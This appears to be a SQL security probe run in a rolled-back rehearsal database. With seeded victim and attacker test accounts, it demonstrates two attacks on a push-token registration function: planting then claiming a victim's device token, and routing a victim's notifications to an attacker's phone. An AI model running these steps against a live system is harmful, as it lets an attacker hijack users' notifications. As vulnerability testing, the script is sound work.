-- D O-3 probes on 128 @ cf73d7b. Local rehearsal DB; BEGIN…ROLLBACK. V = victim, A = attacker.
-- "Session" = V's authenticated JWT (tap.login). The device secret S_v lives only on V's phone.
\set ON_ERROR_STOP 0
BEGIN;
INSERT INTO auth.users (id, instance_id, aud, role, email, raw_app_meta_data, raw_user_meta_data, created_at, updated_at) VALUES
 ('d0300000-0000-4000-8000-00000000000f','00000000-0000-0000-0000-000000000000','authenticated','authenticated','victim@test.local','{"provider":"email"}','{}',now(),now()),
 ('d0300000-0000-4000-8000-00000000000a','00000000-0000-0000-0000-000000000000','authenticated','authenticated','attacker@test.local','{"provider":"email"}','{}',now(),now());
CREATE TEMP TABLE o (n serial, k text, v text) ON COMMIT DROP; GRANT ALL ON o, o_n_seq TO authenticated;

-- ── Attack 1: plant-then-claim on a hash-less row ──────────────────────────
-- V's phone on the SHIPPING client writes its row directly (no hash) — the legacy path, still granted after 128.
SELECT tap.login('d0300000-0000-4000-8000-00000000000f');
INSERT INTO public.push_tokens (user_id, token, platform, is_active) VALUES ('d0300000-0000-4000-8000-00000000000f','ExponentPushToken[victim-phone]','ios',true);
-- PLANT: A holds V's session briefly; reads V's token and registers it with A's secret S_a.
INSERT INTO o(k,v) SELECT '1a.plant_as_victim', public.register_push_token((SELECT token FROM public.push_tokens WHERE user_id='d0300000-0000-4000-8000-00000000000f' LIMIT 1),'ios','attacker-secret-S_a-000','x')::text;
-- V's phone cold-launches the NEW client with its real secret S_v (the every-cold-launch clause)
INSERT INTO o(k,v) SELECT '1b.victim_cold_launch_after_plant', public.register_push_token('ExponentPushToken[victim-phone]','ios','victim-secret-S_v-000','iPhone')::text;
SELECT tap.logout();
INSERT INTO o(k,v) SELECT '1c.stored_hash_is_attackers', (device_secret_hash = encode(sha256(convert_to('attacker-secret-S_a-000','utf8')),'hex'))::text FROM public.push_tokens WHERE token='ExponentPushToken[victim-phone]';
-- V "revokes sessions / resets password": nothing in the schema touches push_tokens (no auth.sessions/refresh_tokens trigger).
-- CLAIM: later, from A's OWN account, no V session.
SELECT tap.login('d0300000-0000-4000-8000-00000000000a');
INSERT INTO o(k,v) SELECT '1d.claim_from_attacker_account', public.register_push_token('ExponentPushToken[victim-phone]','ios','attacker-secret-S_a-000','x')::text;
SELECT tap.logout();
-- V's phone cold-launches again
SELECT tap.login('d0300000-0000-4000-8000-00000000000f');
SAVEPOINT s1;
INSERT INTO o(k,v) SELECT '1e.victim_cold_launch_after_claim', public.register_push_token('ExponentPushToken[victim-phone]','ios','victim-secret-S_v-000','iPhone')::text;
ROLLBACK TO SAVEPOINT s1;
SAVEPOINT s2;
WITH d AS (DELETE FROM public.push_tokens WHERE token='ExponentPushToken[victim-phone]' RETURNING 1) INSERT INTO o(k,v) SELECT '1f.victim_delete_rows_affected', count(*)::text FROM d;
RELEASE SAVEPOINT s2;
SELECT tap.logout();
INSERT INTO o(k,v) SELECT '1g.binding_now', user_id::text || CASE WHEN user_id='d0300000-0000-4000-8000-00000000000a' THEN ' (ATTACKER)' ELSE '' END FROM public.push_tokens WHERE token='ExponentPushToken[victim-phone]';

-- ── Attack 2: forward V's notifications to A's own phone (no legacy row needed) ─────
SELECT tap.login('d0300000-0000-4000-8000-00000000000a');
INSERT INTO o(k,v) SELECT '2a.attacker_registers_own_phone', public.register_push_token('ExponentPushToken[attacker-phone]','ios','attacker-phone-S_ap-00','x')::text;
SELECT tap.logout();
SELECT tap.login('d0300000-0000-4000-8000-00000000000f');   -- A holds V's session briefly
INSERT INTO o(k,v) SELECT '2b.as_victim_rule3_with_attackers_secret', public.register_push_token('ExponentPushToken[attacker-phone]','ios','attacker-phone-S_ap-00','x')::text;
WITH i AS (INSERT INTO public.push_tokens (user_id, token, platform, is_active) VALUES ('d0300000-0000-4000-8000-00000000000f','ExponentPushToken[attacker-phone-2]','android',true) RETURNING 1) INSERT INTO o(k,v) SELECT '2c.as_victim_direct_insert_legacy_path_rows', count(*)::text FROM i;
SELECT tap.logout();
INSERT INTO o(k,v) SELECT '2d.victim_notifications_route_to', string_agg(token, ', ' ORDER BY token) FROM public.push_tokens WHERE user_id='d0300000-0000-4000-8000-00000000000f' AND is_active;
SELECT n, k, v FROM o ORDER BY n;
ROLLBACK;
